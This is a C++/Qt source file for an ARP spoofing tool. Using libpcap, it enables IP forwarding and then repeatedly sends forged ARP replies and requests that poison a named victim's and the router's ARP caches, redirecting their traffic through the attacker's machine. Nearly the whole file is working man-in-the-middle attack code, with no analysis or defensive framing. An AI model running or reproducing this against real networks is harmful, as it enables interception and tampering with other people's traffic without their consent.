#include "relay_falsify.h"
#include <QCoreApplication>
#include <pcap.h>
#include <QHostAddress>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#define mac_size 6
#define ip_size 4

void request_packet();
void reply_packet();
void reply_mac_filter(char *get, u_char *my, int size);
void reply_filter(char *get, u_char *my);
//void reply_print_packet(int len, u_char *packet);

QString relay_len, relay_my_mac, relay_router_mac, relay_router_ip, relay_victim_mac, relay_victim_ip;
pcap_t *cap;
u_char *pack;

u_int cnt = 0;
u_char bc_f[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
u_char bc_0[6] = {0x00,0x00,0x00,0x00,0x00,0x00};

struct arphdr {
    u_int16_t htype;
    u_int16_t ptype;
    u_char hlen;
    u_char plen;
    u_int16_t oper;
    u_char sha[6];		// Sender hardware address
    u_char spa[4];		// Sender IP address
    u_char tha[6];		// Target hardware address
    u_char tpa[4];		// Target IP address
};

relay_falsify::relay_falsify(QObject *parent) : QThread(parent)
{

}

void relay_falsify::run() {
    this->stop = true;
    if(relay_len.toInt() > 42) {
        int size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr);
        pack += size;
        for(int i = 0; i < relay_len.toInt() - size; i++) *(pack + i) = 0x00;
        pack -= size;
    }

    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    while(this->stop) {
        usleep(500000);
        reply_packet();
        request_packet();
        usleep(500000);
        reply_packet();
    }
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
}

void reply_packet() {
    struct arphdr *arph;
    arph = (struct arphdr *)(pack + sizeof(struct libnet_ethernet_hdr));

    reply_mac_filter(relay_victim_mac.toLatin1().data(), pack, mac_size);
    reply_mac_filter(relay_my_mac.toLatin1().data(), pack+ETHER_ADDR_LEN, mac_size);

    pack += sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);

    *(pack - 1) = ARPOP_REPLY;
    reply_mac_filter(relay_my_mac.toLatin1().data(), pack, mac_size);
    reply_mac_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), pack+ETHER_ADDR_LEN, ip_size);

    pack += sizeof(arph->sha) + sizeof(arph->spa);

    reply_mac_filter(relay_victim_mac.toLatin1().data(), pack, mac_size);
    reply_mac_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), pack+ETHER_ADDR_LEN, ip_size);

    pack -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tha) - sizeof(arph->tpa);

    pcap_sendpacket(cap, pack, relay_len.toInt());
//    printf("////////////////// This is reply ///////////////////");
//    reply_print_packet(relay_len.toInt(), pack);
}

void request_packet() {
    int i = 0;
    struct arphdr *arph;
    arph = (struct arphdr *)(pack + sizeof(struct libnet_ethernet_hdr));

    reply_mac_filter(relay_my_mac.toLatin1().data(), pack+ETHER_ADDR_LEN, mac_size);
    reply_mac_filter(relay_my_mac.toLatin1().data(), pack+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arphdr)-sizeof(arph->tpa)-sizeof(arph->tha)-sizeof(arph->spa)-sizeof(arph->sha), mac_size);
    reply_mac_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), pack+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arphdr)-sizeof(arph->tpa)-sizeof(arph->tha)-sizeof(arph->spa), ip_size);
    reply_mac_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), pack+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arphdr)-sizeof(arph->tpa), ip_size);

    if(cnt%2 == 0) {
        for(i = 0; i < ETHER_ADDR_LEN; i++) *(pack+i) = *(bc_f+i);
        pack += sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);
        *(pack - 1) = ARPOP_REQUEST;
        pack += sizeof(arph->sha) + sizeof(arph->spa);
        for(i = 0; i < ETHER_ADDR_LEN; i++) *(pack+i) = *(bc_0+i);
    }
    else {
        reply_mac_filter(relay_router_mac.toLatin1().data(), pack, mac_size);
        pack += sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);
        *(pack - 1) = ARPOP_REPLY;
        pack += sizeof(arph->sha) + sizeof(arph->spa);
        reply_mac_filter(relay_router_mac.toLatin1().data(), pack, mac_size);
    }
    cnt++;

    pack -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tha) - sizeof(arph->tpa);

    pcap_sendpacket(cap, pack, relay_len.toInt());
//    printf("////////////////// This is request ///////////////////");
//    reply_print_packet(relay_len.toInt(), pack);
}

void reply_mac_filter(char *get, u_char *my, int size) {	// owner mac address save at my_mac variable
    int i, j;
    if(size == ETHER_ADDR_LEN) for(i = 0, j = 0; i < ETHER_ADDR_LEN; i++, j+=2) reply_filter(get+j, my+i);
    else for(i = 0, j = 0; i < (ETHER_ADDR_LEN - 2); i++, j+=2) reply_filter(get+j, my+i);
}

void reply_filter(char *get, u_char *my) {
    if(*get - '0' < 0x10) {
        *my = (*get - '0') * 0x10;
        if(*(get+1) - '0' < 0x10) *my += (*(get+1) - '0') * 0x01;
        else *my += (*(get+1) - '0' == 0x31) ? 0x0a : ((*(get+1) - '0' == 0x32) ? 0x0b : ((*(get+1) - '0' == 0x33) ? 0x0c : ((*(get+1) - '0' == 0x34) ? 0x0d : ((*(get+1) - '0' == 0x35) ? 0x0e : 0x0f))));
    }
    else {
        *my = (*get - '0' == 0x31) ? 0xa0 : ((*get - '0' == 0x32) ? 0xb0 : ((*get - '0' == 0x33) ? 0xc0 : ((*get - '0' == 0x34) ? 0xd0 : ((*get - '0' == 0x35) ? 0xe0 : 0xf0))));
        if(*(get+1) - '0' < 0x10) *my += (*(get+1) - '0') * 0x01;
        else *my += (*(get+1) - '0' == 0x31) ? 0x0a : ((*(get+1) - '0' == 0x32) ? 0x0b : ((*(get+1) - '0' == 0x33) ? 0x0c : ((*(get+1) - '0' == 0x34) ? 0x0d : ((*(get+1) - '0' == 0x35) ? 0x0e : 0x0f))));
    }
}
/*
void reply_print_packet(int len, u_char *packet) {
    int cnt = 0;
    printf("\n");
    while(--len != 0) {
        printf("%02x ", *(packet++));
        if ((++cnt % 16) == 0) printf("\n");
    }
    printf("%02x\n", *packet);
}
*/
void relay_falsify::rep_getAll(QString a, QString b, QString c, QString d, QString e, QString f, u_char *g, pcap_t *h) {
    relay_victim_ip = a;
    relay_router_ip = b;
    relay_len = c;
    relay_victim_mac = d;
    relay_my_mac = e;
    relay_router_mac = f;
    pack = g;
    cap = h;
}
